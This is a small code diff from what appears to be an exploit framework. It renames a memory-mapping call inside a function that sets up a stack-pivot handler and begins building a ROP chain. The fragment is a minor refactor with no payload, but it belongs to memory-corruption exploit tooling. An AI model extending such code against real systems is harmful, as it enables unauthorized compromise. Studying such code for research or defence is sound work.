@@ -51,7 +51,7 @@ function signal.setup_pivot_handler(pivot_handler)
     
     signal.fd_addr = memory.alloc(8)
 
-    syscall_mmap(pivot_handler.pivot_base, 0x2000)
+    map_fixed_address(pivot_handler.pivot_base, 0x2000)
     
     local chain = ropchain({
         stack_base = pivot_handler.pivot_addr,
